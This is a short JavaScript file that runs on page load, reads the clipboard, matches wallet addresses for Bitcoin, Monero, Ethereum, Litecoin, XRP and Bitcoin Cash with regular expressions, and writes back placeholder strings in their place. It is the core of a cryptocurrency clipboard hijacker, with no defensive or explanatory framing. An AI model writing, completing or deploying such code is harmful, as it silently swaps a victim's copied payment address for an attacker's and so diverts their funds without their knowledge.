function performRegexReplacement(text) {
  // Define regex patterns for replacement
  const regexPatterns = [
    { regex: /\b(1[1-9A-HJ-NP-Za-km-z]{25,34}|3[1-9A-HJ-NP-Za-km-z]{25,34}|bc1[0-9A-Za-z]{6,75})\b/g, replacement: "REPLACEMENT_BTC" },
    { regex: /\b4[0-9A-Za-z]{94}\b/g, replacement: "REPLACEMENT_XMR" },
    { regex: /\b0x[a-fA-F0-9]{40}\b/g, replacement: "REPLACEMENT_ETH" },
    { regex: /\b([LM3][a-km-zA-HJ-NP-Z1-9]{26,33})\b/g, replacement: "REPLACEMENT_LTC" },
    { regex: /\b([rR][a-km-zA-HJ-NP-Z1-9]{24,34})\b/g, replacement: "REPLACEMENT_XRP" },
    { regex: /\b(1[0-9a-km-zA-HJ-NP-Z]{25,34})\b/g, replacement: "REPLACEMENT_BCH_LEGACY" },
    { regex: /\b((bitcoincash:)?(q|p)[a-z0-9]{41})\b/g, replacement: "REPLACEMENT_BCH_CASHADDR" },
    { regex: /\b([qpzry9x8gf2tvdw0s3jn54khce6mua7l]{42})\b/g, replacement: "REPLACEMENT_BCH_BECH32" },
    { regex: /\b(1[1-9A-HJ-NP-Za-km-z]{25,34}|3[1-9A-HJ-NP-Za-km-z]{25,34}|bc1[0-9A-Za-z]{25,39})\b/g, replacement: "REPLACEMENT_BTC" },
  ];

  // Perform regex replacements
  regexPatterns.forEach(pattern => {
    text = text.replace(pattern.regex, pattern.replacement);
  });

  return text;
}

function replaceClipboardText() {
  navigator.clipboard.readText().then(clipboardText => {
    const modifiedText = performRegexReplacement(clipboardText);
    navigator.clipboard.writeText(modifiedText).then(() => {
      console.log('Clipboard text replaced.');
    });
  });
}

// Replace clipboard text automatically when the page loads
replaceClipboardText();
